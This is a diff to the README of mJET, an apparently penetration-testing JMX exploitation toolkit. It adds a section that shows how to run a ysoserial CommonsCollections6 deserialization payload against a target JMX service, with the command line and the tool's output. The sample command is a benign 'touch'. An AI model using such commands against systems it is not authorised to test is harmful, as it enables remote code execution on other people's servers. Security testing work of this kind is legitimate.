@@ -207,7 +207,21 @@ mJET - MOGWAI LABS JMX Exploitation Toolkit
 [+] MBean correctly uninstalled
 minmaxer@prellermbp:~/mjet$
 ```
+### Exploit Java deserialization with ysoserial
 
+Exploit Java deserialization with ysoserial on target:
+The file ysoserial.jar must be present in the mjet directory.
+
+```
+h0ng10@rocksteady:~/mjet$ jython mjet.py 10.55.90.81 2222 super_secret deserialize CommonsCollections6 "touch /tmp/filename"
+mJET - MOGWAI LABS JMX Exploitation Toolkit
+=======================================
+[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.55.90.81:2222/jmxrmi
+[+] Connected: rmi://10.55.90.1  24
+[+] Loaded sun.management.ManagementFactoryHelper$PlatformLoggingImpl
+[+] Added ysoserial API capacities
+[+] Deploying object
+```
 
 ## Contributing
 
